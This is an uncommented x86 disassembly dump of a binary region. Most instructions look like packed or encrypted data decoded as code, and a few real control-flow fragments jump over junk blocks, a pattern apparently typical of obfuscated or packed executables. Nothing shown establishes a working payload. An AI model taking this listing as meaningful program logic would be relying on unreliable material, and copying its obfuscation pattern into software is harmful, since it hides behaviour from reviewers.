  40f627:	repz or eax,DWORD PTR [esi]
  40f62a:	jnp    0x40f68c
  40f62c:	xchg   BYTE PTR [esi+0x75495728],dh
  40f632:	jnp    0x40f652
  40f634:	call   0x75c645f0
  40f639:	push   edi
  40f63a:	aas    
  40f63b:	aaa    
  40f63c:	cli    
  40f63d:	inc    edi
  40f63e:	fisub  WORD PTR ds:0x9d017cb4
  40f644:	add    eax,0x566da029
  40f649:	pusha  
  40f64a:	add    BYTE PTR [eax+0x56],0xa7
  40f64e:	ins    BYTE PTR es:[edi],dx
  40f64f:	in     al,0x2
  40f651:	push   ecx
  40f652:	fnsave [eiz*4+0x23e30563]
  40f659:	pop    edi
  40f65a:	stos   DWORD PTR es:[edi],eax
  40f65b:	nop
  40f65c:	mov    ecx,ds
  40f65e:	fisub  WORD PTR [ebx+0x1aa56514]
  40f664:	dec    edi
  40f665:	cmp    eax,0xdee4d446
  40f66a:	sbb    eax,0xf23307c4
  40f66f:	int    0xda
  40f671:	retf   
  40f672:	mov    al,0x5d
  40f674:	xor    BYTE PTR [edx],dh
  40f676:	dec    ebp
  40f677:	push   eax
  40f678:	xchg   ebx,eax
  40f679:	xor    eax,0x78fb5101
  40f67e:	adc    bl,BYTE PTR [ebp-0x707af0c9]
  40f684:	push   ss
  40f685:	cmp    al,0x6c
  40f687:	mov    esp,0xa1689ea0
  40f68c:	xchg   ecx,eax
  40f68d:	mov    ebp,0xdf6484d
  40f692:	pop    ebx
  40f693:	rol    DWORD PTR ss:[edx-0x200d028],cl
  40f69a:	xor    eax,0x8e1275f3
  40f69f:	cli    
  40f6a0:	mov    cl,0xbc
  40f6a2:	sbb    BYTE PTR ds:0xdf8fbd2a,bl
  40f6a8:	adc    al,0x55
  40f6aa:	imul   edx,DWORD PTR [ecx-0x7f],0x3e605a2e
  40f6b1:	icebp  
  40f6b2:	sar    BYTE PTR [edi-0x3a1bc333],1
  40f6b8:	or     esi,esi
  40f6ba:	test   al,0x71
  40f6bc:	fiadd  WORD PTR [edx+ecx*4-0x49]
  40f6c0:	lahf   
  40f6c1:	mov    ebp,0x2695dea4
  40f6c6:	cmp    dl,BYTE PTR [edx+ecx*4+0x2a]
  40f6ca:	int3   
  40f6cb:	idiv   BYTE PTR [ebp+0x1e]
  40f6ce:	clc    
  40f6cf:	js     0x40f721
  40f6d1:	mov    edx,0xd7fa4562
  40f6d6:	push   ss
  40f6d7:	xchg   esp,eax
  40f6d8:	dec    esi
  40f6d9:	lods   al,BYTE PTR ds:[esi]
  40f6da:	test   al,0x98
  40f6dc:	cmp    al,0x84
  40f6de:	pusha  
  40f6df:	jbe    0x40f756
  40f6e1:	cmc    
  40f6e2:	pop    es
  40f6e3:	repz cmp BYTE PTR [ebx+ebx*4-0x49],bl
  40f6e8:	xchg   esp,eax
  40f6e9:	adc    DWORD PTR [esi-0x74],0x27
  40f6ed:	sub    esp,eax
  40f6ef:	push   ds
  40f6f0:	jge    0x40f741
  40f6f2:	and    al,0xb4
  40f6f4:	dec    ebp
  40f6f5:	(bad)  
  40f6f6:	cmp    DWORD PTR ds:0xb08855f0,esi
  40f6fc:	imul   ebp,eax,0xece4418f
  40f702:	pop    ebx
  40f703:	js     0x40f745
  40f705:	inc    ebp
  40f706:	push   eax
  40f707:	das    
  40f708:	scas   al,BYTE PTR es:[edi]
  40f709:	mov    eax,0x940d8cef
  40f70e:	add    BYTE PTR gs:[esi+0x12c62aac],al
  40f715:	rcl    ah,cl
  40f717:	imul   edx,DWORD PTR [edx],0xffffffe7
  40f71a:	(bad)  
  40f71b:	xchg   esp,eax
  40f71c:	and    al,bh
  40f71e:	mov    DWORD PTR [ecx],eax
  40f720:	ins    BYTE PTR es:[edi],dx
  40f721:	xchg   DWORD PTR [edx],esp
  40f723:	xor    al,cl
  40f725:	cs xchg edi,eax
  40f727:	int    0xf1
  40f729:	pop    ecx
  40f72a:	out    0xaa,al
  40f72c:	ret    
  40f72d:	or     edx,0x1
  40f730:	cmp    DWORD PTR [edi-0x3fa077f],eax
  40f736:	rcl    DWORD PTR [eax],0x81
  40f739:	leave  
  40f73a:	xor    dl,ah
  40f73c:	inc    eax
  40f73d:	xchg   edx,eax
  40f73e:	ss and dh,dl
  40f741:	shl    dh,cl
  40f743:	adc    DWORD PTR [ebp-0x1db2f3fa],ebp
  40f749:	repz cmc 
  40f74b:	inc    ecx
  40f74c:	mov    WORD PTR [edi+0x10],fs
  40f74f:	dec    eax
  40f750:	nop
  40f751:	in     eax,0x5d
  40f753:	fisub  DWORD PTR [eax-0xb]
  40f756:	shl    bl,1
  40f758:	jno    0x40f6f4
  40f75a:	or     eax,0x33d68e62
  40f75f:	mov    bl,0x90
  40f761:	xchg   ecx,eax
  40f762:	pop    edi
  40f763:	cmp    eax,0xd3779084
  40f768:	jnp    0x40f7bf
  40f76a:	dec    edi
  40f76b:	in     al,dx
  40f76c:	lods   al,BYTE PTR ds:[esi]
  40f76d:	(bad)  
  40f76e:	jns    0x40f7ba
  40f770:	mul    BYTE PTR [esi-0x8b497b7]
  40f776:	in     al,dx
  40f777:	scas   al,BYTE PTR es:[edi]
  40f778:	mov    cl,0xab
  40f77a:	pop    edx
  40f77b:	out    dx,eax
  40f77c:	pop    edx
  40f77d:	and    ch,BYTE PTR [ebx]
  40f77f:	enter  0xc59e,0x66
  40f783:	out    0x9d,al
  40f785:	sub    bh,BYTE PTR [esi]
  40f787:	test   DWORD PTR [ecx-0x2a],eax
  40f78a:	in     eax,0xa0
  40f78c:	dec    ecx
  40f78d:	jge    0x40f78e
  40f78f:	icebp  
  40f790:	cmp    dl,bl
  40f792:	jmp    0x7d0:0x9d99667c
  40f799:	ds aad 0x15
  40f79c:	(bad)  [ebx-0x6255dde6]
  40f7a2:	je     0x40f821
  40f7a4:	pop    eax
  40f7a5:	das    
  40f7a6:	cwde   
  40f7a7:	ret    0xaf0b
  40f7aa:	mov    ch,0x17
  40f7ac:	pusha  
  40f7ad:	mov    ch,0xb3
  40f7af:	or     DWORD PTR ds:[eax+0x45],eax
  40f7b3:	push   eax
  40f7b4:	out    0xc8,al
  40f7b6:	adc    DWORD PTR [ebx],edi
  40f7b8:	jb     0x40f808
  40f7ba:	add    ah,BYTE PTR [esi+eiz*8]
  40f7bd:	retf   0x7752
  40f7c0:	push   ebx
  40f7c1:	nop
  40f7c2:	ficomp DWORD PTR [ebp-0x7cab4869]
  40f7c8:	lahf   
  40f7c9:	out    0x79,eax
  40f7cb:	cli    
  40f7cc:	xor    eax,0xf4f0fde9
  40f7d1:	or     al,0x68
  40f7d3:	adc    bh,BYTE PTR [edi-0x64a77139]
  40f7d9:	cmp    eax,0xbe479c7c
  40f7de:	mov    bl,0xa5
  40f7e0:	cmp    BYTE PTR [eax+edi*2+0x5e],bl
  40f7e4:	mov    BYTE PTR [ecx-0x7f],bl
  40f7e7:	push   ds
  40f7e8:	add    edx,ecx
  40f7ea:	cmp    edi,edx
  40f7ec:	mov    DWORD PTR ds:0x42aef9,0x7d48
  40f7f6:	jmp    0x40fa7e
  40f7fb:	ret    0xc9cd
  40f7fe:	ret    
  40f7ff:	(bad)  
  40f801:	retf   0x10cd
  40f804:	test   BYTE PTR ds:0x7f381c5f,ch
  40f80a:	pusha  
  40f80b:	and    BYTE PTR [edi+0x78],al
  40f80e:	js     0x40f7f5
  40f810:	jle    0x40f88a
  40f812:	js     0x40f824
  40f814:	mov    ah,0x7
  40f816:	and    ebp,ecx
  40f818:	dec    esp
  40f819:	loop   0x40f7d6
  40f81b:	and    BYTE PTR [ecx-0x3c],al
  40f81e:	sbb    dh,ah
  40f820:	ficomp WORD PTR [ecx+0x1055badc]
  40f826:	inc    edx
  40f827:	fimul  DWORD PTR [edi]
  40f829:	addr16 jbe 0x40f7e7
  40f82c:	sbb    dh,BYTE PTR [ebp+0x6b]
  40f82f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f830:	adc    BYTE PTR [esi-0x7e42ac73],0xa9
  40f837:	sub    al,al
  40f839:	in     eax,0xde
  40f83b:	iret   
  40f83c:	jae    0x40f87c
  40f83e:	adc    eax,0x960c3724
  40f843:	and    al,0x9d
  40f845:	mov    ah,0xa7
  40f847:	je     0x40f869
  40f849:	test   ebp,esi
  40f84b:	pop    edx
  40f84c:	push   ebx
  40f84d:	mov    eax,ds:0x73188abc
  40f852:	add    al,0x46
  40f854:	sub    edi,edx
  40f856:	aaa    
  40f857:	add    al,0x4c
  40f859:	pop    ebp
  40f85a:	and    ch,BYTE PTR [edx-0x41]
  40f85d:	pop    ds
  40f85e:	cld    
  40f85f:	leave  
  40f860:	pop    edi
  40f861:	out    dx,eax
  40f862:	call   0xb61dab05
  40f867:	int3   
  40f868:	mov    bl,0xf5
  40f86a:	mov    esp,0x54c0e3ab
  40f86f:	cli    
  40f870:	sahf   
  40f871:	add    BYTE PTR [esi+ecx*2-0x74701229],0x67
  40f879:	adc    eax,0x9b5201f6
  40f87e:	xor    BYTE PTR [eax-0x2960d1a9],dl
  40f884:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f885:	retf   
  40f886:	ja     0x40f8af
  40f888:	mul    BYTE PTR [edi+0x35]
  40f88b:	mov    ebp,0xa8b37088
  40f890:	lods   al,BYTE PTR ds:[esi]
  40f891:	mov    edx,DWORD PTR [edi-0x25051508]
  40f897:	pop    ebx
  40f898:	sub    cl,dl
  40f89a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f89b:	mul    bl
  40f89d:	dec    ebx
  40f89e:	test   BYTE PTR [eax],dh
  40f8a0:	(bad)  
  40f8a1:	ficom  WORD PTR [edx+0x14]
  40f8a4:	inc    ecx
  40f8a5:	clc    
  40f8a6:	xchg   esi,eax
  40f8a7:	fstp   DWORD PTR [edi+0x3d8e78d]
  40f8ad:	jle    0x40f8cb
  40f8af:	in     eax,dx
  40f8b0:	hlt    
  40f8b1:	jecxz  0x40f91d
  40f8b3:	cmp    eax,0x4c9ccefd
  40f8b8:	add    DWORD PTR [ebp+0x6b],0x31
  40f8bc:	outs   dx,DWORD PTR ds:[esi]
  40f8bd:	cmp    bl,BYTE PTR [eax]
  40f8bf:	leave  
  40f8c0:	xor    edx,ebx
  40f8c2:	xchg   esi,eax
  40f8c3:	fwait
  40f8c4:	lods   al,BYTE PTR ds:[esi]
  40f8c5:	ror    DWORD PTR [ebp+0x2b],1
  40f8c8:	data16 lods al,BYTE PTR ds:[esi]
  40f8ca:	sbb    ah,BYTE PTR [ecx]
  40f8cc:	pop    ecx
  40f8cd:	jmp    0x40f92b
  40f8cf:	ss pop edi
  40f8d1:	jmp    0x40f85c
  40f8d3:	cdq    
  40f8d4:	mov    esi,0x416b47c
  40f8d9:	mov    bh,dl
  40f8db:	outs   dx,BYTE PTR ds:[esi]
  40f8dc:	push   esp
  40f8dd:	sar    esi,0x5d
  40f8e0:	call   0x84fea7d0
  40f8e5:	and    ecx,eax
  40f8e7:	shr    BYTE PTR [edx+0x24],cl
  40f8ea:	mov    edx,0x826fd75c
  40f8ef:	dec    eax
  40f8f0:	mov    ecx,0xfc606cb0
  40f8f5:	xchg   DWORD PTR [ebp-0x5c303e7d],esi
  40f8fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f8fc:	cmp    dh,BYTE PTR ds:0xcd030743
  40f902:	jmp    0x40f94c
  40f904:	mov    bh,BYTE PTR [esi]
  40f906:	aas    
  40f907:	push   0xb168db7e
  40f90c:	jmp    0x40f901
  40f90e:	shr    DWORD PTR [eax-0x75534632],0x1c
  40f915:	push   eax
  40f916:	jge    0x40f97b
  40f918:	push   edx
  40f919:	xor    BYTE PTR ds:0xf3894f6f,bl
  40f91f:	arpl   WORD PTR [eax],si
  40f921:	sub    DWORD PTR [esi-0x41a245f4],0x31
  40f928:	dec    edi
  40f929:	cmp    eax,0xc577af95
  40f92e:	jmp    0x39e6:0xb30f4be3
  40f935:	mov    ds:0x545f24e7,al
  40f93a:	sbb    eax,esi
  40f93c:	in     al,dx
  40f93d:	or     eax,0x79071be5
  40f942:	or     DWORD PTR [esi],0x7
  40f945:	test   al,dl
  40f947:	mov    dl,0xfa
  40f949:	call   DWORD PTR [ebp+0x16]
  40f94c:	or     bh,dh
  40f94e:	or     BYTE PTR [edx-0x1d],bl
  40f951:	jbe    0x40f95c
  40f953:	push   es
  40f954:	adc    al,0x75
  40f956:	not    DWORD PTR [ebx]
  40f958:	dec    esi
  40f959:	cli    
  40f95a:	ror    DWORD PTR [ecx+0x59ca271d],cl
  40f960:	sbb    cl,BYTE PTR [edi+0x12]
  40f963:	mov    bh,0x82
  40f965:	mov    ds:0x2e76bbe2,al
  40f96a:	add    dl,BYTE PTR [esi+edx*1-0xa]
  40f96e:	and    BYTE PTR [edx+0x5],dh
  40f971:	retf   
  40f972:	mul    DWORD PTR [edi]
  40f974:	push   es
  40f975:	pushf  
  40f976:	mov    ah,0x6
  40f978:	ss xor ah,bl
  40f97b:	mov    dl,0xdf
  40f97d:	mov    al,ds:0x7ee1ca72
  40f982:	pusha  
  40f983:	push   esp
  40f984:	and    al,0xa4
  40f986:	(bad)  
  40f987:	mov    ss,WORD PTR ds:[edi]
  40f98a:	in     eax,dx
  40f98b:	push   ebp
  40f98c:	mov    BYTE PTR [edi],bh
  40f98e:	hlt    
  40f98f:	arpl   WORD PTR [esi-0x10970f12],dx
  40f995:	adc    al,0xd7
  40f997:	xor    BYTE PTR [eax],0x6c
  40f99a:	test   BYTE PTR [ebx],ch
  40f99c:	mov    bl,0xe0
  40f99e:	fcmovne st,st(6)
  40f9a0:	push   edi
  40f9a1:	and    edi,DWORD PTR [ebx]
  40f9a3:	int    0xe3
  40f9a5:	(bad)  
  40f9a6:	outs   dx,BYTE PTR ds:[esi]
  40f9a7:	stos   DWORD PTR es:[edi],eax
  40f9a8:	push   edx
  40f9a9:	sub    DWORD PTR [edx-0x27],eax
  40f9ac:	adc    al,ch
  40f9ae:	xchg   edi,eax
  40f9af:	add    cl,ch
  40f9b1:	pushf  
  40f9b2:	stc    
  40f9b3:	sub    eax,0xb49d1b77
  40f9b8:	and    DWORD PTR [ecx-0x54d99591],edi
  40f9be:	adc    esi,ebp
  40f9c0:	inc    edx
  40f9c1:	loope  0x40fa3f
  40f9c3:	ret    
  40f9c4:	and    DWORD PTR [edi-0x6aa351c3],ecx
  40f9ca:	push   0xfffffff0
  40f9cc:	push   edx
  40f9cd:	mov    DWORD PTR [esp+eax*4-0x3e],esi
  40f9d1:	adc    BYTE PTR [edx-0x4b],cl
  40f9d4:	sbb    DWORD PTR [esi],ebp
  40f9d6:	add    cl,bh
  40f9d8:	and    BYTE PTR [ebx],al
  40f9da:	push   ebp
  40f9db:	scas   eax,DWORD PTR es:[edi]
  40f9dc:	pop    es
  40f9dd:	pop    es
  40f9de:	cmp    DWORD PTR [edi+0x6781b806],0xfab962e7
  40f9e8:	push   ds
  40f9e9:	popa   
  40f9ea:	mov    ss,WORD PTR [ebx+0x19]
  40f9ed:	and    edi,DWORD PTR [edi+edx*4]
  40f9f0:	pop    edi
  40f9f1:	in     eax,dx
  40f9f2:	add    BYTE PTR [eax],bl
  40f9f4:	ds inc esi
  40f9f6:	sar    BYTE PTR [ebx-0x20c977db],0x92
  40f9fd:	jecxz  0x40f989
  40f9ff:	push   ebx
  40fa00:	mov    es,WORD PTR [esi]
  40fa02:	jb     0x40fa82
  40fa04:	mov    ebp,0x4b0c2e6c
  40fa09:	add    eax,0x5826643d
  40fa0e:	imul   esi,DWORD PTR fs:[eax+0x76],0x35
  40fa13:	(bad)  
  40fa14:	(bad)  
  40fa15:	shr    BYTE PTR [eax+esi*2+0x2dd5858c],1
  40fa1c:	out    dx,eax
  40fa1d:	(bad)  
  40fa1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fa1f:	aas    
  40fa20:	adc    al,0xe8
  40fa22:	add    DWORD PTR [edi],ebp
  40fa24:	mov    eax,0xd7466502
  40fa29:	out    dx,al
  40fa2a:	jge    0x40f9b4
  40fa2c:	sub    DWORD PTR [edx+0x65cafb11],0xc5e62089
  40fa36:	adc    DWORD PTR [ebx+0x4de12d8e],ebx
  40fa3c:	sbb    DWORD PTR [ebp+0x3e],esi
  40fa3f:	xor    edi,ebp
  40fa41:	inc    edx
  40fa42:	das    
  40fa43:	jo     0x40fab3
  40fa45:	nop
  40fa46:	call   0x5b85:0x9266e108
  40fa4d:	cmc    
  40fa4e:	and    bl,bh
  40fa50:	jmp    0x40fa32
  40fa52:	mov    ebp,0x7d8e762e
  40fa57:	in     eax,0xd2
  40fa59:	inc    ebx
  40fa5a:	push   ss
  40fa5b:	mov    BYTE PTR [edi],ch
  40fa5d:	sub    al,0x3b
  40fa5f:	add    ebp,DWORD PTR [ecx-0xd]
  40fa62:	xor    dh,BYTE PTR [esi+0x7fe1ce57]
  40fa68:	outs   dx,DWORD PTR ds:[esi]
  40fa69:	cli    
  40fa6a:	mov    ?,WORD PTR [eax+0x50b98147]
  40fa70:	xchg   edi,eax
  40fa71:	fs icebp 
  40fa73:	push   es
  40fa74:	enter  0xbb20,0x2c
  40fa78:	pop    edi
  40fa79:	or     ecx,DWORD PTR [ebp+0xf154cbc]
  40fa7f:	test   BYTE PTR [ebx+0x53000053],ch
  40fa85:	mov    DWORD PTR ds:0x42af89,0x5779
  40fa8f:	jmp    0x4148fa
  40fa94:	mov    DWORD PTR ds:0x42af41,0x1b
  40fa9e:	cmp    DWORD PTR ds:0x42af41,0x0
  40faa5:	je     0x40faf7
  40faab:	cmp    DWORD PTR ds:0x42af41,0x7
  40fab2:	jne    0x40facb
  40fab8:	push   0x6ecd
  40fabd:	push   0x4c4c
  40fac2:	push   DWORD PTR [ebp-0x1c]
  40fac5:	call   DWORD PTR ds:0x41d1a8
  40facb:	cmp    DWORD PTR ds:0x42af41,0x8
  40fad2:	jne    0x40fae5
  40fad8:	mov    edi,DWORD PTR ds:0x42af41
  40fade:	dec    edi
  40fadf:	mov    DWORD PTR ds:0x42af41,edi
  40fae5:	mov    edi,DWORD PTR ds:0x42af41
  40faeb:	dec    edi
  40faec:	mov    DWORD PTR ds:0x42af41,edi
  40faf2:	jmp    0x40fa9e
  40faf7:	mov    edx,DWORD PTR [ebp-0x8]
  40fafa:	mov    edi,DWORD PTR [ebp-0x10]
  40fafd:	jmp    0x40fd85
  40fb02:	cmp    eax,0xd9c7c9d6
  40fb07:	fcmovnb st,st(1)
  40fb09:	(bad)  
  40fb0a:	cmc    
  40fb0b:	into   
  40fb0c:	inc    edx
  40fb0d:	jge    0x40fb88
  40fb0f:	pop    ebx
  40fb10:	hlt    
  40fb11:	test   DWORD PTR [ebp-0x1a8787bb],ecx
  40fb17:	jle    0x40fb91
  40fb19:	js     0x40fafd
  40fb1b:	sbb    eax,DWORD PTR es:[ebp+0x62451a66]
  40fb22:	loop   0x40fadc
  40fb24:	xor    DWORD PTR [eax-0x5],0xffffffca
  40fb28:	sar    ecx,0x98
  40fb2b:	test   eax,0x953d4dab
  40fb30:	xlat   BYTE PTR ds:[ebx]
  40fb31:	popf   
  40fb32:	icebp  
  40fb33:	mov    eax,0xd0c3e06e
  40fb38:	ret    0x8496
  40fb3b:	xchg   esi,eax
  40fb3c:	scas   al,BYTE PTR es:[edi]
  40fb3d:	pushf  
  40fb3e:	cmc    
  40fb3f:	int3   
  40fb40:	mov    DWORD PTR [edx],esp
  40fb42:	enter  0x70e0,0x98
  40fb46:	out    0xf0,eax
  40fb48:	ins    BYTE PTR es:[edi],dx
  40fb49:	dec    esi
  40fb4a:	push   ecx
  40fb4b:	xchg   esp,eax
  40fb4c:	shr    BYTE PTR [edi+0x6f],1
  40fb4f:	inc    esp
  40fb50:	push   ebx
  40fb51:	inc    ecx
  40fb52:	inc    edx
  40fb53:	arpl   WORD PTR ds:0x8fa6aed7,dx
  40fb59:	or     edi,DWORD PTR [eax-0x836b4f1]
  40fb5f:	inc    ecx
  40fb60:	ss fsub st(3),st
  40fb63:	inc    esp
  40fb64:	push   0x8b8efc1d
  40fb69:	jnp    0x40fb8b
  40fb6b:	add    DWORD PTR [ebp-0x3386f155],ebp
  40fb71:	mov    ebp,0x31ad09b
  40fb76:	pop    edx
  40fb77:	pop    esp
  40fb78:	mov    ah,0x2a
  40fb7a:	icebp  
  40fb7b:	(bad)  
  40fb7c:	xor    eax,0x9195193a
  40fb81:	or     al,0x88
  40fb83:	jl     0x40fb72
  40fb85:	stc    
  40fb86:	fmul   DWORD PTR [edi-0x5]
  40fb89:	inc    eax
  40fb8a:	sbb    BYTE PTR [ecx+0xc],dh
  40fb8d:	sar    DWORD PTR [ecx],cl
  40fb8f:	scas   al,BYTE PTR es:[edi]
  40fb90:	dec    eax
  40fb91:	(bad)  
  40fb92:	fst    DWORD PTR [edi+0x50]
  40fb95:	aaa    
  40fb96:	test   BYTE PTR [esi+ecx*8+0x494cb67f],dh
  40fb9d:	mov    ch,0x38
  40fb9f:	sub    bh,BYTE PTR [esi+0x466f5e3e]
  40fba5:	xchg   DWORD PTR [ebp-0x1c],esp
  40fba8:	out    0x77,eax
  40fbaa:	mov    ah,0x74
  40fbac:	ja     0x40fb32
  40fbae:	mov    DWORD PTR [esp+ebx*1+0x6],edi
  40fbb2:	jl     0x40fbd2
  40fbb4:	dec    ebp
  40fbb5:	jmp    0xfc0f:0xb40e4c55
  40fbbc:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  40fbbe:	retf   
  40fbbf:	add    al,0xfa
  40fbc1:	xchg   edi,eax
  40fbc2:	mov    dl,0x36
  40fbc4:	nop
  40fbc5:	js     0x40fb84
  40fbc7:	je     0x40fb59
  40fbc9:	and    ebx,0xfffffff1
  40fbcc:	inc    ecx
  40fbcd:	mov    bh,0xb3
  40fbcf:	ror    BYTE PTR [ebp-0x6f1f3d29],1
  40fbd5:	cmp    BYTE PTR [ebp+0x35],ah
  40fbd8:	ret    
  40fbd9:	in     al,0x73
  40fbdb:	test   eax,0xfb84ce5e
  40fbe0:	in     al,0x6c
  40fbe2:	jl     0x40fbfc
  40fbe4:	dec    ebx
  40fbe5:	enter  0x65ff,0xb1
  40fbe9:	clc    
  40fbea:	mov    cl,0xc2
  40fbec:	sub    dl,BYTE PTR [ebx+0x46]
  40fbef:	aas    
  40fbf0:	or     BYTE PTR [esi+0x0],cl
  40fbf3:	daa    
  40fbf4:	or     ch,bh
  40fbf6:	pop    esp
  40fbf7:	jns    0x40fbc6
  40fbf9:	mov    ah,0x1c
  40fbfb:	sub    DWORD PTR [edi+eax*1],esi
  40fbfe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fbff:	push   DWORD PTR [ebx+0x5f398be3]
  40fc05:	fs bound esi,QWORD PTR cs:[ebx]
  40fc09:	call   0x43f5:0x49d10141
  40fc10:	mov    al,ds:0x7e12d27c
  40fc15:	inc    eax
  40fc16:	bound  esp,QWORD PTR [edx-0x1cc207bc]
  40fc1c:	mov    ecx,ecx
  40fc1e:	mov    al,0x1e
  40fc20:	out    dx,al
  40fc21:	jae    0x40fc34
  40fc23:	fisub  DWORD PTR [ecx]
  40fc25:	test   DWORD PTR [edi-0x3f26f30a],0x342a4b5f
  40fc2f:	jb     0x40fc45
  40fc31:	push   es
  40fc32:	push   ds
  40fc33:	and    DWORD PTR [ebp-0x53],0x15f07829
  40fc3a:	or     eax,0x59123846
  40fc3f:	mov    dh,0xb2
  40fc41:	sbb    DWORD PTR [edx-0x7f],esp
  40fc44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fc46:	mov    WORD PTR [edi-0x4fb9edb],?
  40fc4c:	fsubr  QWORD PTR [ebx+0x64]
  40fc4f:	xchg   esp,eax
  40fc50:	cwde   
  40fc51:	(bad)  
  40fc52:	nop
  40fc53:	cld    
  40fc54:	les    eax,FWORD PTR [ebx]
  40fc56:	fstp   DWORD PTR [edi+0x72be66d2]
  40fc5c:	pop    ebx
  40fc5d:	test   eax,esp
  40fc5f:	add    edx,DWORD PTR [edx-0x4179d4e6]
  40fc65:	loop   0x40fcae
  40fc67:	push   ss
  40fc68:	ret    0xa898
  40fc6b:	call   0xc2c5a3f4
  40fc70:	mov    edx,0x530fdbcb
  40fc75:	mov    ds,WORD PTR [ecx]
  40fc77:	enter  0x895c,0xb5
  40fc7b:	inc    esp
  40fc7c:	inc    edi
  40fc7d:	inc    esp
  40fc7e:	sub    BYTE PTR [esi],al
  40fc80:	or     eax,0xe70bc292
  40fc85:	inc    bh
  40fc87:	sub    ebx,esi
  40fc89:	dec    edx
  40fc8a:	das    
  40fc8b:	xor    eax,0x1ae9d566
  40fc90:	lds    ecx,FWORD PTR [edi+0x60]
  40fc93:	aas    
  40fc94:	sahf   
  40fc95:	push   esp
  40fc96:	xor    dl,BYTE PTR [edx]
  40fc98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fc99:	sub    eax,0x5861aa8
  40fc9e:	push   edx
  40fc9f:	jmp    0x652b:0xe44c86c
  40fca6:	dec    edx
  40fca7:	test   al,0xef
  40fca9:	sub    eax,0x116fb25a
  40fcae:	ja     0x40fd21
  40fcb0:	mov    cl,0xf1
  40fcb2:	(bad)  
  40fcb3:	retf   
  40fcb4:	pop    ebp
  40fcb5:	adc    ch,BYTE PTR [ecx]
  40fcb7:	push   ebp
  40fcb8:	aad    0x9b
  40fcba:	xlat   BYTE PTR ds:[ebx]
  40fcbb:	add    al,0x5e
  40fcbd:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  40fcbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fcc0:	sub    DWORD PTR [edi+0x3f207abb],0x13
  40fcc7:	push   edx
  40fcc8:	sub    eax,esi
  40fcca:	xchg   edi,eax
  40fccb:	sub    BYTE PTR ds:0xdfd8ee6,0x49
  40fcd2:	psrld  mm1,QWORD PTR [edi+0x77]
  40fcd6:	out    dx,eax
  40fcd7:	inc    edx
  40fcd8:	call   DWORD PTR [edi+0x68550eee]
  40fcde:	pop    eax
  40fcdf:	cdq    
  40fce0:	dec    ebx
  40fce1:	pop    esi
  40fce2:	js     0x40fd1a
  40fce4:	aaa    
  40fce5:	imul   ebp,DWORD PTR [ecx],0x28
  40fce8:	pop    es
  40fce9:	(bad)  
  40fcea:	sub    ebp,esp
  40fcec:	shr    DWORD PTR [ecx],1
  40fcee:	or     BYTE PTR [esi+0x6d9258f4],ch
  40fcf4:	(bad)  
  40fcf5:	mov    ch,0xc9
  40fcf7:	pop    eax
  40fcf8:	out    0xdd,eax
  40fcfa:	ret    
  40fcfb:	fwait
  40fcfc:	pop    es
  40fcfd:	cmp    ebp,ebp
  40fcff:	pop    esp
  40fd00:	push   es
  40fd01:	pop    edx
  40fd02:	test   eax,0x4eed7ec0
  40fd07:	jl     0x40fd13
  40fd09:	fdivrp st(0),st
  40fd0b:	inc    eax
  40fd0c:	int    0x12
  40fd0e:	cld    
  40fd0f:	out    dx,al
  40fd10:	inc    eax
  40fd11:	jae    0x40fd72
  40fd13:	push   es
  40fd14:	aaa    
  40fd15:	popa   
  40fd16:	mov    ebp,0xa4178dd6
  40fd1b:	cmp    bl,BYTE PTR [edi]
  40fd1d:	push   edi
  40fd1e:	xor    ebp,edi
  40fd20:	fwait
  40fd21:	sbb    eax,0x567c1f97
  40fd26:	mov    ah,0x36
  40fd28:	xchg   ebx,eax
  40fd29:	jg     0x40fd14
  40fd2b:	test   eax,0x59e37a61
  40fd30:	pushf  
  40fd31:	fmul   DWORD PTR [ebx+0x77]
  40fd34:	add    BYTE PTR [ebx+0x56],bh
  40fd37:	or     al,0xef
  40fd39:	mov    dl,0x53
  40fd3b:	adc    ebp,ecx
  40fd3d:	pop    ss
  40fd3e:	imul   ecx,ebp,0xaaae2165
  40fd44:	push   0x6c
  40fd46:	(bad)  
  40fd48:	or     al,0x2b
  40fd4a:	inc    esp
  40fd4b:	pusha  
  40fd4c:	xchg   ebx,eax
  40fd4d:	lock push ds
  40fd4f:	mov    al,0xdb
  40fd51:	push   esp
  40fd52:	mov    eax,ds:0xd0215f0e
  40fd57:	ret    0x21d1
  40fd5a:	pop    ds
  40fd5b:	mov    dh,BYTE PTR [eax+0x36126792]
  40fd61:	jae    0x40fdaf
  40fd63:	sbb    BYTE PTR ds:0xf4c895c6,dl
  40fd69:	enter  0xa3b4,0x21
  40fd6d:	sub    al,bl
  40fd6f:	xor    edx,DWORD PTR [edi+0x4c6f5547]
  40fd75:	adc    eax,0xf622e77e
  40fd7a:	or     eax,0x8d87dbf1
  40fd7f:	dec    eax
  40fd80:	pop    eax
  40fd81:	pusha  
  40fd82:	pop    esp
  40fd83:	(bad)  
  40fd85:	sub    edi,edx
  40fd87:	mov    edx,DWORD PTR [ebp-0x4]
  40fd8a:	xor    edx,eax
  40fd8c:	add    edx,ecx
  40fd8e:	cmp    edi,edx
  40fd90:	jb     0x414e2e
  40fd96:	mov    edx,DWORD PTR [ebp-0x28]
  40fd99:	mov    edi,DWORD PTR [ebp-0x4]
  40fd9c:	xor    edx,eax
  40fd9e:	xor    edi,eax
  40fda0:	add    edi,ecx
  40fda2:	add    edx,ecx
  40fda4:	imul   edx,edi
  40fda7:	mov    edi,DWORD PTR [ebp-0x8]
  40fdaa:	jmp    0x410032
  40fdaf:	mov    ecx,0xcac93ec5
  40fdb5:	(bad)  
  40fdb6:	leave  
  40fdb7:	dec    esp
  40fdb8:	mov    bl,0x33
  40fdba:	std    
  40fdbb:	add    DWORD PTR [ecx+ecx*8-0x32],0x7a
  40fdc0:	dec    ebx
  40fdc1:	js     0x40fe3b
  40fdc3:	in     eax,0x7e
  40fdc5:	js     0x40fe3f
